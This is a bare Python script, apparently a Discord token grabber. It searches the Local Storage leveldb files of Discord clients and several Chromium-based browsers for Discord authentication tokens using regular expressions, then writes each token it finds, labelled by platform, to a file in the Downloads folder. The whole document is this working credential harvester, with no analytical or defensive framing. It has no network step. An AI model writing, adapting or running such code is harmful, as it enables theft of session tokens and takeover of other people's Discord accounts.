import re
import os

OUTPUT_FILE = os.path.join(os.path.expanduser("~"), "Downloads", "output_file.txt")

def find_tokens(path):
    path += r'\Local Storage\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens


def get_accounts():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Chromium': local + '\\Chromium\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
    }

    # Open the output file in write mode
    with open(OUTPUT_FILE, 'w') as file:
        # Verify if paths exist
        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            # Look for tokens in the paths
            tokens = find_tokens(path)
            if len(tokens) > 0:
                for token in tokens:
                    # Write platform and token information to the file
                    file.write(f"Platform: {platform}\tToken: {token}\n")


get_accounts()
print(f"Token information has been saved to {OUTPUT_FILE}")
